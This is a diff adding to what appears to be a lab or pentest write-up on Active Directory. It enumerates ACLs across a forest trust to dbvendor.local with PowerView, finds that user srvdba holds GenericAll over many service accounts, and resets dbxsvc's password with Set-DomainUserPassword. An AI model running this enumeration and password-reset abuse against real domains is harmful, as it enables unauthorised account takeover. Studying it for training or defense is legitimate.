@@ -31,7 +31,541 @@ TargetName               : dbvendor.local
 TrustType                : Forest
 TrustDirection           : Bidirectional
 ```
+Find instersting ACls with powerview on the trust domain:
+
+```
+PS C:\Windows\system32> Find-InterestingDomainAcl -ResolveGUIDs -Domain dbvendor.local
 
 
+ObjectDN                : DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
+                          GenericWrite, WriteDacl, WriteOwner
+ObjectAceType           : None
+AceFlags                : ContainerInherit, Inherited
+AceType                 : AccessAllowed
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
+IdentityReferenceName   : DnsAdmins
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
+IdentityReferenceClass  : group
+
+ObjectDN                : DC=@,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
+                          GenericWrite, WriteDacl, WriteOwner
+ObjectAceType           : None
+AceFlags                : ContainerInherit, Inherited
+AceType                 : AccessAllowed
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
+IdentityReferenceName   : DnsAdmins
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
+IdentityReferenceClass  : group
+
+ObjectDN                : DC=A.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
+                          GenericWrite, WriteDacl, WriteOwner
+ObjectAceType           : None
+AceFlags                : ContainerInherit, Inherited
+AceType                 : AccessAllowed
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
+IdentityReferenceName   : DnsAdmins
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
+IdentityReferenceClass  : group
+
+ObjectDN                : DC=B.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
+                          GenericWrite, WriteDacl, WriteOwner
+ObjectAceType           : None
+AceFlags                : ContainerInherit, Inherited
+AceType                 : AccessAllowed
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
+IdentityReferenceName   : DnsAdmins
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
+IdentityReferenceClass  : group
+
+ObjectDN                : DC=C.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
+                          GenericWrite, WriteDacl, WriteOwner
+ObjectAceType           : None
+AceFlags                : ContainerInherit, Inherited
+AceType                 : AccessAllowed
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
+IdentityReferenceName   : DnsAdmins
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
+IdentityReferenceClass  : group
+
+ObjectDN                : DC=D.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
+                          GenericWrite, WriteDacl, WriteOwner
+ObjectAceType           : None
+AceFlags                : ContainerInherit, Inherited
+AceType                 : AccessAllowed
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
+IdentityReferenceName   : DnsAdmins
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
+IdentityReferenceClass  : group
+
+ObjectDN                : DC=E.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
+                          GenericWrite, WriteDacl, WriteOwner
+ObjectAceType           : None
+AceFlags                : ContainerInherit, Inherited
+AceType                 : AccessAllowed
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
+IdentityReferenceName   : DnsAdmins
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
+IdentityReferenceClass  : group
+
+ObjectDN                : DC=F.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
+                          GenericWrite, WriteDacl, WriteOwner
+ObjectAceType           : None
+AceFlags                : ContainerInherit, Inherited
+AceType                 : AccessAllowed
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
+IdentityReferenceName   : DnsAdmins
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
+IdentityReferenceClass  : group
+
+ObjectDN                : DC=G.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
+                          GenericWrite, WriteDacl, WriteOwner
+ObjectAceType           : None
+AceFlags                : ContainerInherit, Inherited
+AceType                 : AccessAllowed
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
+IdentityReferenceName   : DnsAdmins
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
+IdentityReferenceClass  : group
+
+ObjectDN                : DC=H.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
+                          GenericWrite, WriteDacl, WriteOwner
+ObjectAceType           : None
+AceFlags                : ContainerInherit, Inherited
+AceType                 : AccessAllowed
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
+IdentityReferenceName   : DnsAdmins
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
+IdentityReferenceClass  : group
+
+ObjectDN                : DC=I.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
+                          GenericWrite, WriteDacl, WriteOwner
+ObjectAceType           : None
+AceFlags                : ContainerInherit, Inherited
+AceType                 : AccessAllowed
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
+IdentityReferenceName   : DnsAdmins
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
+IdentityReferenceClass  : group
+
+ObjectDN                : DC=J.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
+                          GenericWrite, WriteDacl, WriteOwner
+ObjectAceType           : None
+AceFlags                : ContainerInherit, Inherited
+AceType                 : AccessAllowed
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
+IdentityReferenceName   : DnsAdmins
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
+IdentityReferenceClass  : group
+
+ObjectDN                : DC=K.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
+                          GenericWrite, WriteDacl, WriteOwner
+ObjectAceType           : None
+AceFlags                : ContainerInherit, Inherited
+AceType                 : AccessAllowed
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
+IdentityReferenceName   : DnsAdmins
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
+IdentityReferenceClass  : group
+
+ObjectDN                : DC=L.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
+                          GenericWrite, WriteDacl, WriteOwner
+ObjectAceType           : None
+AceFlags                : ContainerInherit, Inherited
+AceType                 : AccessAllowed
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
+IdentityReferenceName   : DnsAdmins
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
+IdentityReferenceClass  : group
+
+ObjectDN                : DC=M.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
+                          GenericWrite, WriteDacl, WriteOwner
+ObjectAceType           : None
+AceFlags                : ContainerInherit, Inherited
+AceType                 : AccessAllowed
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
+IdentityReferenceName   : DnsAdmins
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=DFSR-LocalSettings,CN=DBVENDOR-DC,OU=Domain Controllers,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : All
+AceFlags                : None
+AceType                 : AccessAllowedObject
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1000
+IdentityReferenceName   : DBVENDOR-DC$
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DBVENDOR-DC,OU=Domain Controllers,DC=dbvendor,DC=local
+IdentityReferenceClass  : computer
+
+ObjectDN                : CN=Domain System Volume,CN=DFSR-LocalSettings,CN=DBVENDOR-DC,OU=Domain
+                          Controllers,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : All
+AceFlags                : Inherited
+AceType                 : AccessAllowedObject
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1000
+IdentityReferenceName   : DBVENDOR-DC$
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DBVENDOR-DC,OU=Domain Controllers,DC=dbvendor,DC=local
+IdentityReferenceClass  : computer
+
+ObjectDN                : CN=SYSVOL Subscription,CN=Domain System
+                          Volume,CN=DFSR-LocalSettings,CN=DBVENDOR-DC,OU=Domain Controllers,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : All
+AceFlags                : Inherited
+AceType                 : AccessAllowedObject
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1000
+IdentityReferenceName   : DBVENDOR-DC$
+IdentityReferenceDomain : dbvendor.local
+IdentityReferenceDN     : CN=DBVENDOR-DC,OU=Domain Controllers,DC=dbvendor,DC=local
+IdentityReferenceClass  : computer
+
+ObjectDN                : CN=db11svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db12svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db13svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db14svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db15svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db16svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db17svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db18svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db19svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db20svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db21svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db22svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db23svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db24svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db25svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db26svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db27svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db28svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db29svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db30svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+ObjectDN                : CN=db1svc,CN=Users,DC=dbvendor,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
+IdentityReferenceName   : srvdba
+IdentityReferenceDomain : db.local
+IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
+IdentityReferenceClass  : user
+
+```
+Reviewing the ACls it's possible with Generic all eprmissions Reset the Password of dbxsvc
+
+```
+Set-DomainUserPassword -Identity dbxsvc -AccountPassword (ConvertTo-SecureString 'Password@123' -AsPlainText -Force) -Domain dbvendor.local –Verbose
+```
 ## Privilege escalation
 
